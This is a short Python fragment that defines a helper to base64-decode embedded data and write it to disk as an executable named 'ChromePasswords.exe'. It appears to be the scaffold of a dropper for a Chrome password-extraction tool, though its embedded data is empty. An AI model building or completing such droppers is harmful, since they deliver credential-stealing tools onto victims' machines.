import sys, base64, inspect, glob, os, getpass, datetime

def write(EXE_NAME, EXE_DATA):
    with open(EXE_NAME, "wb") as file: 
        file.write(base64.b64decode(EXE_DATA))

class ChromePass:
    EXE_NAME = """ChromePasswords.exe"""
    EXE_DATA = b''
    def makeEXE(self): write(EXE_NAME=self.EXE_NAME, EXE_DATA=self.EXE_DATA)
    
